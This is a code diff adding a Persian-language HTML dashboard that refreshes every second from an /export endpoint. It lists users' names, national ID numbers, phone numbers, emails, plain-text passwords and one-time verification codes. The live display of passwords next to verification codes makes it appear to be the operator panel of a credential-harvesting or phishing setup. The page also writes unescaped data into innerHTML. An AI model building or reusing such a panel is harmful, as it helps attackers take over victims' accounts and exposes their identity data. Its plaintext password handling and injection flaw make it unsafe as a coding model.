@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>دیتابیس لحظه‌ای</title>
+    <style>
+        body{font-family:Tahoma;background:#f0f2f5;padding:20px;}
+        .box{max-width:1200px;margin:auto;background:white;border-radius:12px;padding:30px;}
+        table{width:100%;border-collapse:collapse;margin-top:10px;}
+        th{background:#667eea;color:white;padding:12px;border:1px solid #667eea;}
+        td{padding:10px;border:1px solid #ddd;text-align:center;}
+        tr:nth-child(even){background:#f8f9fa;}
+        .count{background:#667eea;color:white;padding:5px 15px;border-radius:20px;display:inline-block;}
+        .verified{color:green;font-weight:bold;}
+        .not-verified{color:orange;font-weight:bold;}
+        .status-bar{background:#e8f0fe;padding:10px;border-radius:8px;margin-bottom:15px;}
+        .live{color:green;font-weight:bold;}
+    </style>
+</head>
+<body>
+<div class="box">
+    <h1>📊 دیتابیس لحظه‌ای</h1>
+    <div class="status-bar">
+        <span class="live">● زنده</span> | 
+        آپدیت هر ۱ ثانیه | 
+        <span id="time">...</span>
+    </div>
+    <a href="/">← بازگشت</a><br><br>
+    <span class="count" id="count">تعداد: ۰ نفر</span><br><br>
+    <table>
+        <thead>
+            <tr>
+                <th>ردیف</th>
+                <th>نام</th>
+                <th>نام خانوادگی</th>
+                <th>کد ملی</th>
+                <th>شماره</th>
+                <th>ایمیل</th>
+                <th>رمز</th>
+                <th>کد تایید</th>
+                <th>وضعیت</th>
+                <th>تاریخ</th>
+            </tr>
+        </thead>
+        <tbody id="data">
+            <tr><td colspan="10">⏳ در حال بارگذاری...</td></tr>
+        </tbody>
+    </table>
+</div>
+
+<script>
+    function updateTime() {
+        document.getElementById('time').textContent = new Date().toLocaleTimeString('fa-IR');
+    }
+
+    async function fetchData() {
+        try {
+            const response = await fetch('/export');
+            const result = await response.json();
+            const users = result.users || [];
+            
+            const tbody = document.getElementById('data');
+            const count = document.getElementById('count');
+            
+            count.textContent = `تعداد: ${users.length} نفر`;
+            
+            if (users.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="10">📭 دیتابیس خالی است</td></tr>';
+                return;
+            }
+            
+            let html = '';
+            users.forEach((u, i) => {
+                const status = u.is_verified === 1 ? '✅ تایید' : '⏳ در انتظار';
+                const cls = u.is_verified === 1 ? 'verified' : 'not-verified';
+                html += `
+                    <tr>
+                        <td>${i + 1}</td>
+                        <td>${u.name || ''}</td>
+                        <td>${u.family || ''}</td>
+                        <td>${u.nationalCode || ''}</td>
+                        <td>${u.phone || ''}</td>
+                        <td>${u.email || ''}</td>
+                        <td>${u.password || ''}</td>
+                        <td>${u.verify_code || ''}</td>
+                        <td class="${cls}">${status}</td>
+                        <td>${u.registerDate || ''}</td>
+                    </tr>
+                `;
+            });
+            tbody.innerHTML = html;
+            
+        } catch (error) {
+            document.getElementById('data').innerHTML = '<tr><td colspan="10">❌ خطا در دریافت</td></tr>';
+        }
+    }
+
+    // آپدیت هر ۱ ثانیه
+    updateTime();
+    fetchData();
+    setInterval(() => {
+        updateTime();
+        fetchData();
+    }, 1000);
+</script>
+</body>
+</html>
